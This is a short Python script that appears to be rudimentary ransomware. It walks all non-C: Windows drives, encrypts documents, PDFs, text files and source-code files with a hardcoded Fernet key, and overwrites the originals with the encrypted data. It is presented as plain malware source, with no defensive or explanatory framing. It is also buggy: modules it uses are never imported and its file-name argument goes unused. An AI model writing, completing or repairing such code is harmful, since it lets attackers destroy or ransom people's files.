import base64
from cryptography.fernet import Fernet
import sys
def encrypt(data):
        key = b'm7n8s1gPc1J9jJfAnicV_kTwYtYjQdVXY6EzFQpEAac='
        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        payload = base64.b64encode(encrypted) 
        return payload
def find_file(root_folder):
    for root,dirs,files in os.walk(root_folder):
        for f in files:
            try:
                ext = f.split(".")[1]
            except:
                continue
            if(ext == "docx" or ext == "txt" or ext == "pptx" or ext == "pdf" or ext == "json" or ext == "html" or ext == "css" or ext == "js" or ext == "c" or ext == "java" or ext=="py"):
                try:
                    path = str(os.path.join(root, f))
                    temp = str(os.path.join(root, "temp.txt"))
                    f= open(path,'rb')
                    fw = open(temp,'wb')
                    fw.write(encrypt(f.read()))
                    fw.close()
                    f.close()
                    os.remove(path)
                    fw = open(path,'wb')
                    f = open(temp,'rb')
                    fw.write(f.read())
                    f.close()
                    fw.close()
                    os.remove(temp)
                except:
                    continue
def find_file_in_all_drives(file_name):
    for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
        if(str(drive) == "C:\\"):
                continue
        find_file( drive)
find_file_in_all_drives('id_rsa.txt')
